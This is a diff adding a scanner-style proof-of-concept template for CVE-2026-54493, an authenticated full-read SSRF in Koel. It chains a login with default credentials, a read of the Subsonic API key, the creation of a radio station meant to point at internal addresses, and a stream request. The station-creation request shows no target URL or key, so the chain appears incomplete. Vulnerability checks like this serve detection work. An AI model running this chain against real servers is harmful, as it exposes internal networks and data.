@@ -1,0 +1,88 @@
+[info]
+author = "AVE"
+description = "通过 Subsonic 接口创建指向内网地址的电台，利用电台流播放功能使服务器发起 HTTP 请求并将响应内容返回给攻击者，实现全读取型 SSRF 攻击"
+id = "POC-AVE-2026-0553"
+name = "Koel Authenticated Full-Read SSRF via Subsonic Radio Stations PoC"
+severity = "high"
+tags = [
+    "cve-2026-54493",
+    "ssrf",
+    "koel",
+]
+vuln_id = [
+    "CVE-2026-54493",
+    "AVE-2026-0553",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/me"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"email":"admin@koel.dev","password":"KoelIsCool"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["token"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/data"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["subsonic_api_key"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/rest/createInternetRadioStation.view"
+protocol = "http"
+
+[poc.requests.headers]
+Accept = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ['"status":"ok"']
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/rest/getInternetRadioStations.view"
+protocol = "http"
+
+[poc.requests.headers]
+Accept = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["internetRadioStation"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/radio/stream/{{station_id}}"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
